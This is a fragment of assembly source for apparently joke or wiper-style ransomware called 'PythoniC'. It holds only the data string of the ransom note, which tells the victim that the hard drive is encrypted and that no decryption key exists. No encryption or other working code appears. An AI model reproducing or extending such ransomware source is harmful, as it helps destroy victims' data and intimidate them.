...
descriptionString: db ' Your hard drive had been encrypted LOL...', 0xA, 0xD,' There is no escape with out a decryption key', 0xA, 0xD,' BUT... this key doesnt exist!', 0xA, 0xD, ' LOL! ', 0xA, 0xD, ' ', 0xA, 0xD, ' Discription:', 0xA, 0xD, '---------------------------------------------', 0xA, 0xD, 'PythoniC is a ransom that isnt rly a ransom... there is no key, mabey.' ', 0xA, 0xD, ' ', 0xA, 0xD, 0 ; <= Text for show
